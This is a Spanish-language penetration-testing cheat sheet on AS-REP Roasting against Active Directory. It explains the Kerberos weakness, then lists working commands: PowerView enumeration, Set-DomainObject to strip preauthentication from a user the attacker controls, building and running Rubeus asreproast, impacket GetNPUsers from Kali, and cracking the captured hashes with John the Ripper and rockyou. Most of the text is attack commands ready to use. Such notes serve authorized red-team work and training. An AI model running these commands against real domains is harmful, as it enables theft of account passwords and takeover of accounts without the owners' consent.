# AS-REP Roasting 

Tags: #AD #Rubeus #Windows #ASREPRoasting #Kali #JohnTheRipper 

Es una técnica de abuso de Kerberos en entornos de Active Directory que permite obtener material cifrado crackeable de cuentas que tienen deshabilitada la preautenticación (“Do not require Kerberos preauthentication”); en este escenario, un atacante puede enviar un AS-REQ al KDC sin autenticarse previamente y recibir un AS-REP cuyo contenido está cifrado con una clave derivada de la contraseña del usuario objetivo, permitiendo extraer ese blob y realizar cracking offline sin generar intentos fallidos de login, siendo especialmente crítico cuando la cuenta afectada tiene privilegios elevados o contraseñas débiles.

```powershell
# Utilizar PowerView para enumerar todos los usuarios que no requieren preautenticación
❯ Get-DomainUser -PreauthNotRequired  
```

## ACL - WriteALL (Activar No Preauth)

Esto se puede hacer cuando un usuario tiene el privilegio de 'GenericAll, GenericWrite' sobre otro usuario se puede activar la flag de 'No Preauthentication' de manera remota sobre el segundo usuario

```powershell 
# Utilizar Powershell para que el usuario que tiene privilegios 'WriteAll' sobre 'user2' pueda colocarle la no preautenticación 
❯ Set-DomainObject -Identity user2 -XOR @{useraccountcontrol=4194304} -Verbose 
```

## Rubeus - Windows 

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Visual Studio 2026](https://visualstudio.microsoft.com/es/downloads/)

Para instalar la herramienta se debe de compilar en 'Visual Studio' en el Windows a utilizar:
1. Descargar el .zip del código desde la url anterior y descomprimirlo
2. Iniciar la instalación de Visual Studio 
	- En la pestaña de los componentes... seleccionar 'Desarrollo de escritorio .NET' y dar click en instalar 
	- Escoger 'Abrir un proyecto o una solución' y seleccionar el archivo 'Rubeus' 
	- Actualizar el destino a .NET Framework 4.8 y dar click en 'continuar' 
3. En Visual Studio seleccionar el fichero raiz 'Rubeus'
4. Ir a la pestaña 'compilar' y dar click en 'Compilar Rubeus'

```bash 
# Utilizar Rubeus en Windows 
❯ .\Rubeus.exe -h     # Menú de ayuda 

❯ .\Rubeus.exe asreproast    # Ejecutar el ataque sin indicar algún formato
❯ .\Rubeus.exe asreproast /format:john /outfile:hash.john   # Ataque ASREP-Roast y obtener el hash de algún usuario que no tenga la preautenticación para despúes crackearlo offline
```

## Impacket - Kali 

Ejecutar el ataque de ASREP Roasting con la herramienta impacket desde Kali.

```bash 
# Ataque ASREP-Roast y obtener el hash de algún usuario que no tenga la preautenticación para despúes crackearlo offline
❯ impaket-GetNPUsers domain/ -users users.txt -format john -outputfile asrep.hash    

# Usar este comando si se tienen credenciales válidas de un usuario de dominio
❯ impaket-GetNPUsers domain/user1:password1 -format john -outputfile asrep.hash   # Usará LDAP y utilizará todos los usuarios del dominio para obtener el hash si alguno no tiene la preautenticación 
```

## Crackear el hash con John 

```bash 
❯ john asrep.hash   # Crackear el hash para obtener la password 
❯ john asrep.hash -w /usr/share/wordlist/rockyou.txt 
❯ john asrep.hash --show  # Mirar la password 
```